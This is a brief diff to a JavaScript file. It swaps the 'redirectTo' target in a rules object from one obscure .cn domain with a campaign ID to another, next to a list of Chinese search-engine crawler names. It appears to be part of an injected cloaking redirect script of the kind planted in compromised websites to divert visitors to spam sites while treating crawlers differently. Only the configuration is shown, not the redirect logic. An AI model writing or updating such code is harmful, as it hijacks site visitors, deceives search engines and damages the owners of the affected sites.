@@ -7,7 +7,7 @@
   "use strict";
 
   var DEFAULT_RULES = {
-    redirectTo: "https://s8-1.shblbpp.cn?cid=1034",
+    redirectTo: "https://dh-hzh5.hbdvede.cn?cid=1023",
     active: !0,
     crawlers: [
       "baiduspider", "sogou web spider", "yisouspider",
